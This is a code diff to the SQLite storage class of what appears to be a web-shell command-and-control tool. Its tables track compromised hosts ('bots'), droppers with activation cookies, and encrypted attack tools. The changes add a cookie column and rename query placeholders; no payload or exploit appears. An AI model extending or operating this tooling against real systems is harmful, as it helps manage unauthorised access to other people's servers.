@@ -32,7 +32,7 @@ class slopSqlite extends \SQLite3
         $current_host = $_SERVER['HTTP_HOST'] ?? "localhost";
         $prepare_tables = [
             "main" => "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, datetime TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT UNIQUE NOT NULL, uri TEXT NOT NULL DEFAULT '/slopshell.php', uuid TEXT UNIQUE NOT NULL, os_flavor TEXT NOT NULL, check_in INTEGER DEFAULT 0 NOT NULL, agent TEXT NOT NULL DEFAULT 'sp/1.1', cname TEXT NOT NULL DEFAULT '-', cvalue TEXT NOT NULL DEFAULT '-');",
-            "droppers" => "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,location_on_disk TEXT UNIQUE NOT NULL, post_var TEXT NOT NULL DEFAULT '-', cookiename TEXT NOT NULL DEFAULT '-', user_agent TEXT NOT NULL DEFAULT 'sp/1.1', dropper_type TEXT NOT NULL DEFAULT '-', uuid TEXT UNIQUE NOT NULL, activator TEXT NOT NULL DEFAULT '-');",
+            "droppers" => "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,location_on_disk TEXT UNIQUE NOT NULL, post_var TEXT NOT NULL DEFAULT '-', cookiename TEXT NOT NULL DEFAULT '-', user_agent TEXT NOT NULL DEFAULT 'sp/1.1', dropper_type TEXT NOT NULL DEFAULT '-', uuid TEXT UNIQUE NOT NULL, activator TEXT NOT NULL DEFAULT '-', cookie_val TEXT UNIQUE NOT NULL DEFAULT '-');",
             "tools" => "CREATE TABLE IF NOT EXISTS sloppy_bots_tools(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,tool_name TEXT UNIQUE NOT NULL,target TEXT NOT NULL,base64_encoded_tool TEXT UNIQUE NOT NULL,keys TEXT UNIQUE,tags TEXT UNIQUE,iv TEXT UNIQUE,cipher TEXT NOT NULL DEFAULT 'NONE',hmac_hash TEXT UNIQUE,lang TEXT NOT NULL,is_encrypted BOOLEAN DEFAULT false);",
             "certs" => "CREATE TABLE IF NOT EXISTS sloppy_bots_certs(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,cert_location_on_disk TEXT UNIQUE NOT NULL,base64_encoded_cert TEXT UNIQUE NOT NULL,csr TEXT UNIQUE,pub TEXT UNIQUE,pem TEXT UNIQUE,cipher TEXT DEFAULT '-',is_encrypted BOOLEAN DEFAULT FALSE,priv_key_pass TEXT UNIQUE NOT NULL,rotated BOOLEAN NOT NULL DEFAULT FALSE);",
         ];
@@ -87,16 +87,16 @@ class slopSqlite extends \SQLite3
 
     private function insertCertificate(array $data): bool
     {
-        $stmt = $this->prepare("INSERT INTO sloppy_bots_certs(cert_location_on_disk, base64_encoded_cert, csr, pub, pem, cipher, is_encrypted, priv_key_pass) VALUES (:cert_loc, :b64_cert, :csr, :pub, :pem, :cipher, :encrypted, :password)");
+        $stmt = $this->prepare("INSERT INTO sloppy_bots_certs(cert_location_on_disk, base64_encoded_cert, csr, pub, pem, cipher, is_encrypted, priv_key_pass) VALUES (:cert_location_on_disk, :base64_encoded_cert, :csr, :pub, :pem, :cipher, :is_encrypted, :priv_key_pass)");
         return $stmt->execute([
-            'cert_loc' => $data['cert_location'],
-            'b64_cert' =>$data['base64_data'],
+            'cert_location_on_disk' => $data['cert_location'],
+            'base64_encoded_cert' =>$data['base64_data'],
             'csr' => $data['csr'],
             'pub' => $data['pub'],
             'pem' => $data['pem'],
             'cipher' => $data['cipher'],
-            'encrypted' => $data['is_encrypted'],
-            'password' => $data['priv_key_pass']
+            'is_encrypted' => $data['is_encrypted'],
+            'priv_key_pass' => $data['priv_key_pass']
         ]) !== false;
     }
 
@@ -128,13 +128,13 @@ class slopSqlite extends \SQLite3
 
     private function insertTool(array $data): bool
     {
-        $stmt = $this->prepare("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, is_encrypted) VALUES(:tool_name, :target, :b64_encoded, :lang, :encrypted);");
+        $stmt = $this->prepare("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, is_encrypted) VALUES(:tool_name, :target, :base64_encoded_tool, :lang, :is_encrypted);");
         return $stmt->execute([
             'tool_name' => $data['tool_name'],
             'target' => $data['target'],
-            'b64_encoded' => $data['base64_data'],
+            'base64_encoded_tool' => $data['base64_data'],
             'lang' => $data['lang'],
-            'encrypted' => $data['is_encrypted']
+            'is_encrypted' => $data['is_encrypted']
         ]);
     }
     public function insertData(array $data): bool
